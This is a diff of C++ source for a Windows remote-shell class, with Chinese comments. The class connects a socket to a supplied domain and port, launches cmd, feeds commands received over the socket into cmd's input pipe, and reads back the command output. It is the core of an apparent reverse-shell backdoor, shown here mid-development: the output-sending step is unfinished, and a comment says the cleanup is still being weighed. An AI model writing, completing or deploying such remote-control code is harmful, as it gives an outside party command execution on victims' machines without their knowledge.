@@ -30,15 +30,8 @@ void Shell::startShell(std::string domain, int port) {
 		gSock.dissconnect();
 		return;
 	}
-	// 创建沟通cmd管道和socket的线程函数
-	HANDLE hReadPipe = CreateThread(NULL, 0, Shell::threadReadPipe, (LPVOID)NULL, 0, NULL);
-	if (!hReadPipe) {
-		OutputDebugStringA("Failed to create new thread read pipe\r\n");
-		gSock.dissconnect();
-		TerminateProcess(gPi.hProcess, 0);
-		return;
-	}
-	// 创建沟通cmd管道和socket的线程函数
+
+	// 创建负责输入命令的线程
 	HANDLE hReadSock = CreateThread(NULL, 0, Shell::threadReadSock, (LPVOID)NULL, 0, NULL);
 	if (!hReadSock) {
 		OutputDebugStringA("Failed to create new thread read socket\r\n");
@@ -88,11 +81,57 @@ bool Shell::createCmd() {
 	return true;
 }
 
-// 线程函数 负责读管道并转发
-DWORD Shell::threadReadPipe(LPVOID args) {
-
-}
 // 线程函数 负责读socket并转发
 DWORD Shell::threadReadSock(LPVOID args) {
 
+	int iRecv;
+	DWORD dwBytesWrite;
+	while (true)
+	{
+		RtlZeroMemory(szSend, sizeof(szSend));
+		iRecv = gSock.recvData(szSend, sizeof(szSend));
+		if (-1 == iRecv) {
+			OutputDebugStringA("cannot read from sock and stop shell\r\n");
+			break;
+		}
+
+		if (!WriteFile(ghWritePipe2, szSend, iRecv, &dwBytesWrite, NULL)) {
+			OutputDebugStringA("cannot write to pipe and stop shell\r\n");
+			break;
+		}
+	}
+
+	TerminateProcess(gPi.hProcess, 0);
+	gSock.dissconnect();
+	return 1;
+}
+
+// 接收cmd回显并传送
+void Shell::flushResults() {
+
+	do
+	{
+		DWORD dwBytesResult = 0;
+		RtlZeroMemory(szResult, sizeof(szResult));
+		// 先看有没有数据 防止没有数据还去读引起堵塞
+		if (!PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
+			OutputDebugStringA("cannot peek pipe and stop shell\r\n");
+			break;
+		}
+
+		// 刷新成功但是没有数据
+		if (!dwBytesResult) {
+			return;
+		}
+
+		// 有数据就读
+		RtlZeroMemory(szResult, sizeof(szResult));
+		if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
+			OutputDebugStringA("cannot read pipe and stop shell\r\n");
+			break;
+		}
+
+	} while (false);
+
+	// 这里在斟酌怎么合理地安排处理后事
 }
